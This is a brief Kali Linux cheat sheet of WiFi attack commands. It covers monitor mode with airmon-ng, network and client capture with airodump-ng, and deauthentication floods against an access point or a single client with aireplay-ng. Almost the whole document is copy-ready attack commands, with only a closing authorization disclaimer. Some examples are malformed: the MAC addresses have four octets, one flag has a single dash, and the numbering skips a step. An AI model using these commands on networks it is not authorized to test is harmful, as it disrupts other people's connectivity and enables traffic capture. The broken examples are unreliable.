## Kali Linux WiFi Attack Commands
1. `ifconfig`
2. `iwconfig`
## Start the Wireless Interface in Monitor Mode
4. `airmon-ng start wlan0` (replace `wlan0` with your device name)
5. `airodump-ng wlan0` - Shows all networks around
6. `airodump-ng --channel 8 --bssid [MAC address] wlan0mon` - Shows devices connected to the selected WiFi network

## AIRODUMP-NG

- `airodump-ng --channel <channel> -bssid <BSSID> --write <file_name> <interface>`
  
  Example: `airodump-ng --channel 12 --bssid 40:30:20:10 --write test mon0`

## Deauthentication Attack

- `aireplay-ng --deauth <#packets> -a <AP> <interface>`

  Example: `aireplay-ng --deauth 1000 -a 10:20:30:40 mon0`

## Target Attack

- `aireplay-ng --deauth <#packets> -a <AP> -c <target> <interface>`

  Example: `aireplay-ng --deauth 1000 -a 10:20:30:40 -c 00:AA:11:BB mon0`


Remember, unauthorized use of these commands for network intrusion or any unethical activities may be illegal. Always obtain proper authorization before conducting any penetration testing or security research. These commands are for educational purposes to understand the basics of WiFi monitoring and manipulation.
